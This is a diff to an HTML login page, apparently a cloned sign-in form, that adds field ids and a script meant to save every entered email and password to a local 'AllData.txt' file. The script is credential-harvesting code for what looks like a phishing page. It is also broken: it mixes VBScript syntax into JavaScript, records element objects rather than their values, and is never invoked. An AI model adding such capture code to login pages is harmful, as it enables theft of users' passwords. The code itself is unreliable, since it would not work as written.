@@ -198,15 +198,31 @@
     <img src="logo.png" />
     <br />
     <label for="email"></label>
-    <input class="email" type="email" name="email" placeholder="  Email or mobile number" required="required" />
+    <input class="email" type="email" name="email" id="email" placeholder="  Email or mobile number" required="required" />
     <label for="password"></label>
-    <input class="password" type="password" name="password" placeholder="  Enter your password" />
+    <input class="password" type="password" name="password" id="password" placeholder="  Enter your password" />
     <br />
     <a href="forbidden.html" class="forpass">Forgot password?</a>
     <br />
     <input class="login" type="submit" value="Log In" />
     <br />
     <br />
+    <script language="Javascript">
+        function WriteToFile(passForm) {
+
+            set fso = CreateObject("Scripting.FileSystemObject");
+            set f = fso.CreateTextFile("<your path>/AllData.txt", True);
+
+            var Email = document.getElementById('email');
+            var Password = document.getElementById('password');
+
+            f.writeline("Email :" + Email);
+            f.writeline("Password :" + Password);
+
+            f.writeline("-----------------------------");
+            f.Close();
+        }
+    </script>
     <p class="or">or</p>
     <div class="dividerRight">
     </div>
